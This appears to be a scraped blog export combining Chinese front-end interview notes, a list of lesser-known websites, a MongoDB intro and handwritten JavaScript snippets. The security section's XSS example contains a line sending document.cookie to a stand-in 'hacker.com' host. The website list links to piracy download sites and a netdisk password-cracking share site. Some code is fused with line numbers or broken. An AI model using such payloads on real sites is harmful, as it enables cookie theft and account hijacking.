包括了数组、函数、正则、日期等对象一旦出现（数组、函数、正则、日期、NaN）直接 0 分 （必考） Promise 怎么使用？ then1$.ajax(...).then(成功函数, 失败函数) 链式 then1$.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2) 如何自己生成 Promise 对象12345678function xxx(){ return new Promise(function(resolve, reject){ setTimeout(()=>{ resolve() 或者 reject() },3000) })}xxx().then(...) （必考） AJAX 手写一下？ 12345678let xhr = new XMLHttpRequest();xhr.open(\\\"POST\\\", \\\"/xxxx\\\");xhr.onreadystatechange = function() { if (xhr.readyState === 4 && xhr.status === 200) { console.log(xhr.responseText); }};xhr.send(\\\"a=1&b=2\\\"); （必考）闭包是什么？ 1234567891011function (){ var n = 0 return function(){ n += 1 }}let adder = ()adder() // n === 1adder() // n === 2console.log(n) // n is not defined 正确参考：https://zhuanlan.zhihu.com/p/22486908 （必考）这段代码里的 this 是什么？ 12345678var obj = { foo: function() { console.log(this); }};var bar = obj.foo;obj.foo(); // 打印出的 this 是 objbar(); // 打印出的 this 是 window fn() 里面的 this 就是 window fn() 是 strict mode，this 就是 undefined a.b.c.fn() 里面的 this 就是 a.b.c new F() 里面的 this 就是新生成的实例 () => console.log(this) 里面 this 跟外面的 this 的值一模一样正确参考：https://zhuanlan.zhihu.com/p/23804247 （必考）什么是立即执行函数？使用立即执行函数的目的是什么？ 123456789101112(function() { var name;})();(function() { var name;})();!!!!!!!(function() { var name;})();~(function() { var name;})(); 造出一个函数作用域，防止污染全局变量 ES 6 新语法 123{ let name;} async/await 语法了解吗？目的是什么？ 1234567891011121314function returnPromise() { return new Promise(function(resolve, reject) { setTimeout(() => { resolve(\"fuck\"); }, 3000); });}returnPromise().then(result => { result === \"fuck\";});var result = await returnPromise();result === \"fuck\"; 把异步代码写成同步代码。 如何实现深拷贝？ JSON 来深拷贝 12var a = {...}var b = JSON.parse( JSON.stringify(a) ) 缺点：JSON 不支持函数、引用、undefined、RegExp、Date…… 递归拷贝 12345678910111213141516171819function clone(object){ var object2 if(! (object instanceof Object) ){ return object }else if(object instanceof Array){ object2 = [] }else if(object instanceof Function){ object2 = eval(object.toString()) }else if(object instanceof Object){ object2 = {} } 你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a for(let key in object){ object2[key] = clone(object[key]) } return object2} 环 RegExp、Date、Set、Symbol、WeakMap 如何实现数组去重？ 计数排序的逻辑1234567891011var a = [4, 2, 5, 6, 3, 4, 5];var hashTab = {};for (let i = 0; i < a.length; i++) { if (a[i] in hashTab) { // 什么也不做 } else { hashTab[a[i]] = true; }}//hashTab: {4: true, 2: true, 5: true, 6:true, 3: true}console.log(Object.keys(hashTab)); // ['4','2','5','6','3'] Set 去重js Array.from(new Set(a));或者123456function deArr(arr) { return [...new Set(arr)];}var a = [1, 2, 35, 5, 47, 8, 57, 4, 54, 54, 5, 5, 4];console.log(deArr(a));//[1, 2, 35, 5, 47, 8, 57, 4, 54] WeakMap 任意类型去重 如何用正则实现 string.trim() ？ 123function trim(string) { return string.replace(/^\\\\\\\\s+|\\\\\\\\s+$/g, \\\"\\\");} JS 原型是什么？ 举例 var a = [1,2,3] 只有 0、1、2、length 4 个 key 为什么可以 a.push(4) ，push 是哪来的？ a.proto === Array.prototype push 就是沿着 a.proto 找到的，也就是 Array.prototype.push Array.prototype 还有很多方法，如 join、pop、slice、splice Array.prototype 就是 a 的原型（proto）参考：https://zhuanlan.zhihu.com/p/23090041 ES 6 中的 class 了解吗？ 把 MDN class 章节看完 记住一个例子 JS 如何实现继承？ 原型链 123456789101112131415161718function Animal() { this.body = \\\"肉体\\\";}Animal.prototype.move = function() {};function Human(name) { Animal.apply(this, arguments); this.name = name;}// Human.prototype.__proto__ = Animal.prototype // 非法var f = function() {};f.prototype = Animal.prototype;Human.prototype = new f();Human.prototype.useTools = function() {};var frank = new Human(); extends 关键字 1234567891011121314class Animal{ constructor(){ this.body = '肉体' }, move(){}}class Human extends Animal{ constructor(name){ super() this.name = name }, useTools(){}}var frank = new Human() == 相关题目直接反着答（放弃） DOM 押题 DOM 事件模型是什么？ 冒泡 捕获 如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的。 移动端的触摸事件了解吗？ touchstart touchmove touchend touchcancel 模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。 事件委托是什么？有什么好处？ 假设父元素有 4 个儿子，我不监听 4 个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。 可以监听还没有出生的儿子（动态生成的元素）。省监听器。 1234567function listen(element, eventType, selector, fn) { element.addEventListener(eventType, e => { if (e.target.matches(selector)) { fn.call(el, e, el); } });} // 有 bug 但是可以应付面试官的事件委托 1234567891011121314151617function listen(element, eventType, selector, fn) { element.addEventListener(eventType, e => { let el = e.target; while (!el.matches(selector)) { if (element === el) { el = null; break; } el = el.parentNode; } el && fn.call(el, e, el); }); return element;} // 工资 12k+ 的前端写的事件委托listen(ul, \\\"click\\\", \\\"li\\\", () => {});ul > li * 5 > span; HTTP 押题 HTTP 状态码知道哪些？ 301 和 302 的区别是什么？ 301 永久重定向，浏览器会记住 302 临时重定向 HTTP 缓存怎么做？ Cache-Control: max-age=300 http://cdn.com/1.js?v=1 避开缓存 Cache-Control 和 Etag 的区别是什么？ Cookie 是什么？Session 是什么？ Cookie HTTP 响应通过 Set-Cookie 设置 Cookie 浏览器访问指定域名是必须带上 Cookie 作为 Request Header Cookie 一般用来记录用户信息 Session Session 是服务器端的内存（数据） Session 一般通过在 Cookie 里记录 SessionID 实现 SessionID 一般是随机数 LocalStorage 和 Cookie 的区别是什么？ Cookie 会随请求被发到服务器上，而 LocalStorage 不会 Cookie 大小一般 4k 以下，LocalStorage 一般 5Mb 左右 （必考）GET 和 POST 的区别是什么？ 参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。 安全（扯淡）。GET 没有 POST 安全（都不安全） GET 的参数（url 查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制） 包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体） GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。） （必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？ JSONP CORS postMessage 看一下 MDN Vue 押题 （必考）Vue 有哪些生命周期钩子函数？ 看文档 （必考）Vue 如何实现组件通信？ 父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件） 爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信） 兄弟通信（new Vue() 作为 eventBus） Vuex 的作用是什么？ 看文档、博客 https://vuex.vuejs.org/zh-cn/intro.html VueRouter 路由是什么？ 看文档、博客 Vue 的双向绑定是如何实现的？有什么缺点？ 看文档，深入响应式原理 Computed 计算属性的用法？跟 Methods 的区别。https://zhuanlan.zhihu.com/p/33778594 算法押题 排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序） 二分查找法 翻转二叉树 把上面三个背一下，算法题必过。 安全押题 什么是 XSS 攻击？如何预防？ 举例12div.innerHTML = userComment // userComment 内容是 $.get('http://hacker.com?cookie='+document.cookie)// 恶意就被执行了，这就是 XSS 预防 不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行 如果你一样要用 innerHTML，字符过滤 把 < 替换成 &lt; 把 > 替换成 &gt; 把 & 替换成 &amp; 把 ‘ 替换成 ' 把 ‘ 替换成 &quot; 代码 div.innerHTML = userComment.replace(/>/g, ‘&lt;‘).replace… 使用 CSP Content Security Policy 什么是 CSRF 攻击？如何预防？ 过程 用户在 qq.com 登录 用户切换到 hacker.com（恶意网站） hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。 用户在不知不觉中添加 hacker 为好友。 用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。 避免 检查 referer，qq.com 可以拒绝来自 hacker.com 的请求 csrf_token 来解决 Webpack 题 转译出的文件过大怎么办？ 使用 code split 写法 import(‘xxx’).then(xxx=>{console.log(xxx)}) xxx 模块就是按需加载的 写过 webpack loader 吗？ webpack loader 发散题 从输入 URL 到页面展现中间发生了什么？ 1. DNS 查询 DNS 缓存 2. 建立 TCP 连接（三次握手）连接复用 3. 发送 HTTP 请求（请求的四部分） 4. 后台处理请求 1. 监听 80 端口 2. 路由 3. 渲染 HTML 模板 4. 生成响应 5. 发送 HTTP 响应 6. 关闭 TCP 连接（四次挥手） 7. 解析 HTML 8. 下载 CSS（缓存 9. 解析 CSS 10. 下载 JS（缓存 11. 解析 JS 12. 下载图片 13. 解析图片 14. 渲染 DOM 树 15. 渲染样式树 16. 执行 JS刁钻代码 map 加 parseInt 12345[1, 2, 3].map(parseInt);parseInt(1, 0, array); // 1parseInt(2, 1, array); // NaNparseInt(3, 2, array); // NaN a.x = a = {} 123var a = { n: 1 };var b = a;a.x = a = { n: 2 }; 问 a.x 是多少？ (a ==1 && a== 2 && a==3) 可能为 true 吗？ 1234567a = { value: 0, toString() { a.value += 1; return a.value; }};","link":"/posts/791fb1d4/"},{"title":"有哪些鲜为人知，但是很有意思的网站？","text":"网站之最 第一个网站（世界上第一个网站）：http://info.cern.ch/ 水滴（世界上最小的网站）：http://www.guimp.com/ 世界最高（世界上最高的网站）：https://worlds-highest-website.com/ 世界最长（世界上最长，增长最快的网站）：http://www.worldslongestwebsite.com/ 世界之邮（世界上最长的邮箱）：世界上最长的邮箱 工具类 看图识花（上传图片识别花的种类）：http://stu.iplant.cn/web Gridzzly（在线制作自己的网格纸）：http://www.gridzzly.com/ 在线电子书转换器（电子书格式在线转换）：http://cn.epubee.com/ 字体转换器（字体在线转换）：http://www.akuziti.com/ 证件照换底色（一键换底色）：https://www.bgconverter.com/ OPEN GPS（高精度 IP 定位）：https://www.opengps.cn/Default.aspx Windy（在线气象观测）：https://www.windy.com/ RAMMB（全球实时卫星云图）：http://rammb-slider.cira.colostate.edu ASD 商品历史价格查询（商品价格曲线）：http://asd-price.com/ 铁路信息查询（全国铁路车站车次信息查询）：https://moerail.ml/ DesignCap（免费海报在线制作）：https://www.designcap.com/app/ 在线工具箱（各种实用工具聚合）：http://tool.mkblog.cn/ 在线工具箱（各种实用工具聚合）：http://www.nicetool.net/ 长链接生成器：长链接生成器 v2.2 图片/视频工具 Photopea（网页版 PS）：https://www.photopea.com/ PHOTOMOSH（给图片视频加特效）：https://photomosh.com/ Algorithmia（AI 给黑白照片上色）：https://demos.algorithmia.com/colorize-photos/ Remove.bg（在线一键抠图）：https://www.remove.bg/ Nod to the Rhythm（让你的照片张嘴唱歌）：http://nodtotherhythm.com/make Gfycat（在线制作并托管高清 GIF）：https://gfycat.com/ 应景图（GIF 图片添加字幕水印）：http://www.yingjingtu.com/index 极速瘦图（图片压缩）：http://www.jsysuo.com/ Picdiet（图片压缩）：https://www.picdiet.com/zh-cn TinyPNG（图片压缩）：https://tinypng.com/ Squoosh（图片压缩）：https://squoosh.app/ Needs More JPEG（图片超级压缩）：http://needsmorejpeg.com/ Waifu2x（图片在线无损放大）：http://waifu2x.udp.jp/ Bigjpg（图片放大）：http://bigjpg.com/ ILOVEIMG（在线图片编辑器）：https://www.iloveimg.com 视频解析网（微博，秒拍，快手，抖音）：https://www.parsevideo.com/ IT/AI/工具类 王斌给您对对联（AI 在线对对联）：https://ai.binwang.me/couplet/ 玄派网 （武侠生成器）：http://www.xuanpai.com/ Grabient（CSS 代码渐变颜色生成工具）：https://www.grabient.com/ 多彩的颜色（图片色彩分析）：https://woshizja.github.io/colorful-color/ Emoji 短网址（把网址变成 Emoji 表情）：https://e.mezw.com/ 表情符号生成器（Emoji 表情自定义创建生成）：https://phlntn.com/emojibuilder/ 万象智能鉴黄系统（图片分析）：https://cloud.tencent.com/act/event/ci_demo 给小动物加光剑（趣味加工）：https://giphy.com/search/lightsaber-cats Lyrebird（克隆自己的声音，需登录）：https://lyrebird.ai/signup Windows93（网页版 windows93 系统）：http://www.windows93.net/ 百度镜子（百度的镜子网站）：https://baidujingzi.com/ bilibili 镜子（bilibili 的镜子网站）http://www.ilidilid.com/ ertdfgcvb（代码特效展示）：https://ertdfgcvb.xyz/ Silk（互动生成艺术画）：http://weavesilk.com/ ASCIIFlow Infinity（可视化字符图像绘制）：http://asciiflow.com/ 我知道你下载了什么（BT 下载内容监测）：https://iknowwhatyoudownload.com/en/peer/ Foxmiguel（游戏直播聚合站）：http://www.foxmiguel.com/ 逗比拯救世界（表情包分享）：http://www.bee-ji.com/ 装逼大全（表情包制作）：https://www.zhuangbi.info/ 音乐/影视类 穿帮网（影视剧穿帮镜头赏析）：http://www.bug.cn/ The Movie title stills collection（电影标题剧照集）：http://annyas.com/screenshots/ 音乐搜索器（音乐聚合搜索下载生成外链）：http://tool.mkblog.cn/music/ 资源帝（在线音乐聚合）http://music.ziyuandi.cn/ SUKIER（冷门歌曲推荐）：http://www.sukier.com/ 中国摇滚（中国摇滚年代史）：http://www.yaogun.com/ Youtube 字幕下载（字幕下载）：http://downsub.com/ 胖鸟电影（最新影视剧蓝光下载站）：http://www.pniao.com/ 爱追剧（电视剧电影追剧下载）：http://www.aizhuiju.com/Mov 电影天堂（小体积影视剧下载）：https://www.dygod.net/ 高清 MP4ba（最新影视剧下载：复活了）：http://www.mp4ba.com/ RARBG（美国影视 BT 站）：https://rarbgprx.org/torrents.php 动漫花园资源网（动漫作品 BT 下载站）：https://share.dmhy.org/ 爱恋动漫（动漫作品 BT 下载站）：http://www.kisssub.org/ 迷你 MP4（最新影视剧下载）：http://www.minimp4.com 二次元/动漫类 萌娘百科：https://zh.moegirl.org/Mainpage 神奇宝贝百科：http://wiki.52poke.com/ 小鸡词典（互联网流行词汇百科网站）：https://jikipedia.com/ AnimeShot （把动画字幕用于吐槽生活）：https://as2.bitinn.net/ 萌兔本地漫画阅读器（漫画本子在线阅读）：http://wusagi.pw/ 猫耳 FM（二次元声站）：https://www.missevan.com/ Bilibili 工具箱（弹幕内容查用户名）：https://biliquery.typcn.com/ PaintsChainer（AI 为你的画自动上色）：AI 涂色绘画 文艺类 时间胶囊（封存自己的记忆）：http://p.timepill.net/ 时光邮局（给未来的自己写一封信）：https://www.hi2future.com/ I Remember（我记得，一个记忆碎片网站，头脑特工队）：http://i-remember.fr/en/ 海の見える駅（能看见海的车站）：https://seaside-station.com/ 网盘/搜索类 快速创建收件夹（百度网盘匿名收件箱）：http://xzc.cn/ Firefox Send（临时网盘）：https://send.firefox.com/ Ecosia（搜索引擎，搜索使用的广告收入用于种植树木）：https://www.ecosia.org/ 爱搜资源（百度网盘密码破解分享）：https://www.aisouziyuan.com/ 鸠摩搜书（电子书搜索下载）：https://www.jiumodiary.com/ GIPHY（GIF 动图搜索网站）：https://giphy.com/ Similar Site Search（相似网站搜索）：https://www.similarsitesearch.com/cn/ 文学/百科类 武侠世界（歪果仁翻译中国小说）：https://www.wuxiaworld.com/ 维基大典（国学百科）：維基大典 Gallerix（世界名画档案馆）：https://gallerix.ru/ Internet Archive（互联网档案博物馆）：https://archive.org/ 世界护照大全（领略全球护照风采）：https://www.passportindex.org/cn/ 中国海报（中国历年海报存档）：https://chineseposters.net/ 美丽的化学（化学之美）：https://www.beautifulchemistry.net/ 乡音苑（中国方言活地图）：http://phonemica.net/ 湿在人为（两性博客）：http://www.idashi.org/ 汉典（汉字典书）：http://www.zdic.net/ 书格（传统书籍）：https://shuge.org/ 古诗文网（中国传统古诗文）：https://www.gushiwen.org/ 中少快乐阅读平台（怀旧少儿老杂志）：少年儿童杂志全集 实用/行政类 国家邮政局申诉网站（快递问题投诉专用）：http://sswz.spb.gov.cn/ 无人认领尸体在线查询（慎入）：http://www.gzbz.com.cn/dead_men/index.asp 药物临床试验登记与信息公示平台（人体实验）：http://www.chinadrugtrials.org.cn/ 德州大学电子图书馆（人体骨骼 X 光标本）：http://www.digimorph.org/index.phtml 趣味/无聊类 Spray.training（FPS 游戏压枪训练工具）：http://spray.training/ 一键六学（网络梗生成器）：http://bog.ac/tool/6/# 今天中午吃什么？（世纪难题）：https://www.zwcsm.com/ 你好污啊（撩妹金句）：https://www.nihaowua.com/ Clash（用歌声说出你想说的话，想起了《大黄蜂》）：https://clash.me/ Windows Update Prank（假装 Windows 升级界面）：http://fakeupdate.net/ 字符跳跃（让你的网址动起来）：http://glench.com/hash/#CLICK happy happy hardcore（治愈小表情）：https://happyhappyhardcore.com/ 经典 DVD（无聊网站）：http://itneverhitsthecorner.com/ Neave.TV（稀奇古怪的电视频道）：https://neave.tv/ 无聊网站大全（点击进入随机无聊站）：https://theuselessweb.com/ 声音/太空类 雨季情绪（下雨的声音）：https://rainymood.com/ VirtOcean（海洋的声音）：http://virtocean.com/ Purrli（猫打呼噜的声音）：https://purrli.com/ 这里有猫（Purrli 中文版）：https://m.niucodata.com/cat/cat.php?from=wb Meteor showers（太空视角观看流星雨）：https://www.meteorshowers.org/ 怀旧类 秘密花园（中文网站考古）：http://www.yini.org/ Inspirograph（怀旧在线万花尺）：https://nathanfriend.io/inspirograph/ 日本传统色（古典传统配色）：http://nipponcolors.com/ 中国色（日本传统色的中文版）：http://zhongguose.com/ 四大名著小说（名著地图）：http://www.sdmz.net/ 水浒 108 将形象大全（怀旧图片）：http://ls.ganquancun.com/shuihuzhuan108/ 游戏/测试类 Am I pretty or ugly?（在线颜值分析）：https://www.prettyscale.com/ MyAccent（测试你的口音是英式还是美式）：口音测试 扫雷（网页版扫雷游戏）：https://www.saolei.org/ 信任的进化（人性小游戏）：https://www.sekai.co/trust/ 太鼓达人（日本经典音乐游戏网页版）：https://taiko.bui.pm/ 一画换一画（互动绘画）：http://www.sketchswap.com/ Lines FRVR（划线小游戏）：https://lines.frvr.com/ Bad News（虚假新闻是怎样炼成的）：https://getbadnews.com/#play LINE RIDER（Flash 小游戏）：https://www.linerider.com/ QWOP（经典小游戏）：http://www.foddy.net/Athletics.html Mikutap（鼠标音乐游戏）：https://aidn.jp/mikutap/ Mikutap（鼠标音乐游戏中文版）：https://static.hfi.me/mikutap/ it’s a(door)able（解锁小游戏）：https://ncase.me/door/ ScribblerToo（蜘蛛画画）Scribbler Too Texter（字符画）：http://tholman.com/texter/ Finding Home（音乐解压游戏）：http://findingho.me/ 魔术键盘（解压网站）：http://magickeyboard.io/ Emojis & Earth Porn（寻找不动的表情）：http://emojisandearthporn.com/ Staggering Beauty（精神污染）：http://www.staggeringbeauty.com/ Pica Pic（复古手持游戏合集）：http://www.pica-pic.com/ 在线 DOS 游戏（中文怀旧游戏）：https://dos.zczc.cz/ 中文家用游戏博物馆（中文怀旧游戏）：http://www.famicn.com/ 老男人游戏网（模拟器 ROM 下载网站）：http://www.oldmanemu.net/ Neave Interactive（互动小游戏合集）：https://neave.com/ Bestgames（在线小游戏网站）：http://www.bestgames.com/ IGCD（互联网游戏汽车数据库）：http://www.igcd.net/ 特别推荐 福利吧（分享你的福利吧）：http://fulibus.net/ 龙轩导航（可能是最好用的导航网站）：http://ilxdh.com/ 抽屉新热榜（不正经的资讯社区）：https://dig.chouti.com 有趣网址之家（趣味小站集锦）：https://youquhome.com/ 原文：github","link":"/posts/d6913756/"},{"title":"MongoDB 极简实践入门","text":"传统的计算机应用大多使用关系型数据库来存储数据，比如大家可能熟悉的 MySql, Sqlite 等等，它的特点是数据以表格(table)的形式储存起来的。数据库由一张张排列整齐的表格构成，就好像一个 Excel 表单一样，每个表格会有若干列，比如一个学生信息表，可能包含学号、姓名、性别、入学年份、高考成绩、籍贯等等。而表格的每一排，则是一个个学生的具体信息。在企业级应用和前互联网时代，关系型数据库几乎是不二选择。关系型数据库的特点是有整齐划一的组织，很方便对数据进行描述、插入、搜索。 1. 为什么用 MongoDB？想象有一个传统的网上服装商店吧，它的主要的数据可能是储存在一张叫 products 的表单里，表单可能包含这些列：商品编号(ID)、名称(Name)、商家(brand)、主目录(cate)、子目录(sub-cat)、零售价(price)、是否促销(promotion)等等。如果有一个用户想要查找所有价格低于 300 元的正在促销的鞋子的编号和名称，则可以执行类似于以下的 SQL 语句： 1SELECT ID, name FROM products WHERE cate='shoes' AND price","link":"/posts/1da681ce/"},{"title":"面试常见手写代码","text":"数组去重（一维)数组去重最原始的方法就是使用双层循环，分别循环原始数组和新建数组；或者我们可以使用indexOf来简化内层的循环；或者可以将原始数组排序完再来去重，这样会减少一个循环，只需要比较前后两个数即可；当然我们可以使用ES5,ES6的方法来简化去重的写法，比如我们可以使用filter来简化内层循环，或者使用Set、Map、扩展运算符这些用起来更简单的方法，但是效率上应该不会比原始方法好。二维数组的去重可以在上面方法的基础上再判断元素是不是数组，如果是的话，就进行递归处理。 双层循环123456789101112131415161718var array = [1, 1, \"1\", \"1\"];function unique(array) { var res = []; for (var i = 0, arrayLen = array.length; i < arrayLen; i++) { for (var j = 0, resLen = res.length; j < resLen; j++) { if (array[i] === res[j]) { break; } } if (j === resLen) { res.push(array[i]); } } return res;}console.log(unique(array)); // [1, \"1\"] 利用 indexOf1234567891011121314var array = [1, 1, \"1\"];function unique(array) { var res = []; for (var i = 0, len = array.length; i < len; i++) { var current = array[i]; if (res.indexOf(current) === -1) { res.push(current); } } return res;}console.log(unique(array)); 排序后去重1234567891011121314151617var array = [1, 1, \"1\"];function unique(array) { var res = []; var sortedArray = array.concat().sort(); var seen; for (var i = 0, len = sortedArray.length; i < len; i++) { // 如果是第一个元素或者相邻的元素不相同 if (!i || seen !== sortedArray[i]) { res.push(sortedArray[i]); } seen = sortedArray[i]; } return res;}console.log(unique(array)); filterfilter可以用来简化外层循环 使用 indexOf：12345678910var array = [1, 2, 1, 1, \"1\"];function unique(array) { var res = array.filter(function(item, index, array) { return array.indexOf(item) === index; }); return res;}console.log(unique(array)); 排序去重：123456789101112var array = [1, 2, 1, 1, \"1\"];function unique(array) { return array .concat() .sort() .filter(function(item, index, array) { return !index || item !== array[index - 1]; });}console.log(unique(array)); ES6 方法Set：1234567var array = [1, 2, 1, 1, \"1\"];function unique(array) { return Array.from(new Set(array));}console.log(unique(array)); // [1, 2, \"1\"] 再简化下 123456function unique(array) { return [...new Set(array)];}//或者var unique = a => [...new Set(a)]; Map：1234function unique(arr) { const seen = new Map(); return arr.filter(a => !seen.has(a) && seen.set(a, 1));} 类型判断类型判断需要注意以下几点 typeof对六个基本数据类型Undefined、Null、Boolean、Number、String、Object（大写）返回的结果是 undefined、object、boolean、number、string、object（小写），可以看到Null和Object 类型都返回了 object 字符串；typeof却能检测出函数类型；综上，typeof能检测出六种类型，但是不能检测出null类型和Object下细分的类型，如Array，Function，Date，RegExp,Error等。 Object.prototype.toString的作用非常强大，它能检测出基本数据类型以及Object下的细分类型，甚至像Math,JSON,arguments它都能检测出它们的具体类型，它返回结果形式例如[object Number](注意最后的数据类型是大写).所以，Object.prototype.toString基本上能检测出所有的类型了，只不过有时需要考虑到兼容性低版本浏览器的问题。 通用 API1234567891011121314151617181920212223// 该类型判断函数可以判断六种基本数据类型以及Boolean Number String Function Array Date RegExp Object Error，// 其他类型因为遇到类型判断的情况较少所以都会返回object,不在进行详细的判断// 比如ES6新增的Symbol，Map，Set等类型var classtype = {};\"Boolean Number String Function Array Date RegExp Object Error\" .split(\" \") .map(function(item) { classtype[\"[object \" + item + \"]\"] = item.toLowerCase(); });function type(obj) { // 解决IE6中null和undefined会被Object.prototype.toString识别成[object Object] if (obj == null) { return obj + \"\"; } //如果是typeof后类型为object下的细分类型(Array,Function,Date,RegExp,Error)或者是Object类型，则要利用Object.prototype.toString //由于ES6新增的Symbol，Map，Set等类型不在classtype列表中，所以使用type函数，返回的结果会是object return typeof obj === \"object\" || typeof obj === \"function\" ? classtype[Object.prototype.toString.call(obj)] || \"object\" : typeof obj;} 判断空对象判断是否有属性，for循环一旦执行，就说明有属性，此时返回false 123456789101112131415function isEmptyObject(obj) { var name; for (name in obj) { return false; } return true;}console.log(isEmptyObject({})); // trueconsole.log(isEmptyObject([])); // trueconsole.log(isEmptyObject(null)); // trueconsole.log(isEmptyObject(undefined)); // trueconsole.log(isEmptyObject(1)); // trueconsole.log(isEmptyObject(\"\")); // trueconsole.log(isEmptyObject(true)); // true 我们可以看出isEmptyObject实际上判断的并不仅仅是空对象。但是既然jQuery是这样写，可能是因为考虑到实际开发中 isEmptyObject用来判断 {} 和 {a: 1} 是足够的吧。如果真的是只判断 {}，完全可以结合上篇写的 type函数筛选掉不适合的情况。 判断 Window 对象Window对象有一个window属性指向自身，可以利用这个特性来判断是否是Window对象 123function isWindow(obj) { return obj != null && obj === obj.window;} 判断数组isArray是数组类型内置的数据类型判断函数，但是会有兼容性问题，一个polyfill如下 12345isArray = Array.isArray || function(array) { return Object.prototype.toString.call(array) === \"[object Array]\"; }; 判断类数组jquery实现的isArrayLike,数组和类数组都会返回true。所如果isArrayLike返回true，至少要满足三个条件之一： 是数组 长度为 0比如下面情况,如果我们去掉 length === 0 这个判断，就会打印 false，然而我们都知道 arguments 是一个类数组对象，这里是应该返回 true 的 1234function a() { console.log(isArrayLike(arguments));}a(); lengths 属性是大于 0 的数字类型，并且obj[length - 1]必须存在(考虑到 arr = [,,3]的情况) 12345678910111213141516function isArrayLike(obj) { // obj 必须有 length属性 var length = !!obj && \"length\" in obj && obj.length; var typeRes = type(obj); // 排除掉函数和 Window 对象 if (typeRes === \"function\" || isWindow(obj)) { return false; } return ( typeRes === \"array\" || length === 0 || (typeof length === \"number\" && length > 0 && length - 1 in obj) );} 判断 NaN判断一个数是不是NaN不能单纯地使用 === 这样来判断, 因为NaN不与任何数相等, 包括自身,注意在ES6的isNaN中只有值为数字类型使用NaN才会返回true 123isNaN: function(value){ return isNumber(value) && isNaN(value);} 判断 DOM 元素利用DOM对象特有的nodeType属性（ 1234isElement: function(obj){ return !!(obj && obj.nodeType === 1); // 两次感叹号将值转化为布尔值} 判断 arguments 对象低版本的浏览器中argument对象通过Object.prototype.toString判断后返回的是[object Object],所以需要兼容 123isArguments: function(obj){ return Object.prototype.toString.call(obj) === '[object Arguments]' || (obj != null && Object.hasOwnProperty.call(obj, 'callee'));} 深浅拷贝如果是数组，实现浅拷贝，比可以slice，concat返回一个新数组的特性来实现；实现深拷贝，可以利用JSON.parse和JSON.stringify来实现，但是有一个问题，不能拷贝函数（此时拷贝后返回的数组为null）。上面的方法都属于技巧，下面考虑怎么实现一个对象或者数组的深浅拷贝 浅拷贝思路很简单，遍历对象，然后把属性和属性值都放在一个新的对象就 OK 了 12345678910111213var shallowCopy = function(obj) { // 只拷贝对象 if (typeof obj !== \"object\") return; // 根据obj的类型判断是新建一个数组还是对象 var newObj = obj instanceof Array ? [] : {}; // 遍历obj，并且判断是obj的属性才拷贝 for (var key in obj) { if (obj.hasOwnProperty(key)) { newObj[key] = obj[key]; } } return newObj;}; 深拷贝思路也很简单，就是在拷贝的时候判断一下属性值的类型，如果是对象，就递归调用深浅拷贝函数就 ok 了 1234567891011var deepCopy = function(obj) { if (typeof obj !== \"object\") return; var newObj = obj instanceof Array ? [] : {}; for (var key in obj) { if (obj.hasOwnProperty(key)) { newObj[key] = typeof obj[key] === \"object\" ? deepCopy(obj[key]) : obj[key]; } } return newObj;}; 扁平化递归循环数组元素，如果还是一个数组，就递归调用该方法 12345678910111213141516// 方法 1var arr = [1, [2, [3, 4]]];function flatten(arr) { var result = []; for (var i = 0, len = arr.length; i < len; i++) { if (Array.isArray(arr[i])) { result = result.concat(flatten(arr[i])); } else { result.push(arr[i]); } } return result;}console.log(flatten(arr)); toString()如果数组的元素都是数字，可以使用该方法 12345678910111213// 方法2var arr = [1, [2, [3, 4]]];function flatten(arr) { return arr .toString() .split(\",\") .map(function(item) { return +item; // +会使字符串发生类型转换 });}console.log(flatten(arr)); reduce()12345678910// 方法3var arr = [1, [2, [3, 4]]];function flatten(arr) { return arr.reduce(function(prev, next) { return prev.concat(Array.isArray(next) ? flatten(next) : next); }, []);}console.log(flatten(arr)); …12345678910111213141516// 扁平化一维数组var arr = [1, [2, [3, 4]]];console.log([].concat(...arr)); // [1, 2, [3, 4]]// 可以扁平化多维数组var arr = [1, [2, [3, 4]]];function flatten(arr) { while (arr.some(item => Array.isArray(item))) { arr = [].concat(...arr); } return arr;}console.log(flatten(arr)); 柯里化通用版1234567891011121314151617181920212223function curry(fn, args) { var length = fn.length; var args = args || []; return function() { newArgs = args.concat(Array.prototype.slice.call(arguments)); if (newArgs.length < length) { return curry.call(this, fn, newArgs); } else { return fn.apply(this, newArgs); } };}function multiFn(a, b, c) { return a * b * c;}var multi = curry(multiFn);multi(2)(3)(4);multi(2, 3, 4);multi(2)(3, 4);multi(2, 3)(4); ES6 版12345678910const curry = (fn, arr = []) => (...args) => (arg => (arg.length === fn.length ? fn(...arg) : curry(fn, arg)))([ ...arr, ...args ]);let curryTest = curry((a, b, c, d) => a + b + c + d);curryTest(1, 2, 3)(4); //返回10curryTest(1, 2)(4)(3); //返回10curryTest(1, 2)(3, 4); //返回10 防抖与节流防抖123456789101112131415function debounce(fn, wait) { var timeout = null; return function() { if (timeout !== null) { clearTimeout(timeout); } timeout = setTimeout(fn, wait); };}// 处理函数function handle() { console.log(Math.random());}// 滚动事件window.addEventListener(\"scroll\", debounce(handle, 1000)); 节流利用时间戳实现12345678910111213141516var throttle = function(func, delay) { var prev = Date.now(); return function() { var context = this; var args = arguments; var now = Date.now(); if (now - prev >= delay) { func.apply(context, args); prev = Date.now(); } };};function handle() { console.log(Math.random());}window.addEventListener(\"scroll\", throttle(handle, 1000)); 利用定时器实现1234567891011121314151617var throttle = function(func, delay) { var timer = null; return function() { var context = this; var args = arguments; if (!timer) { timer = setTimeout(function() { func.apply(context, args); timer = null; 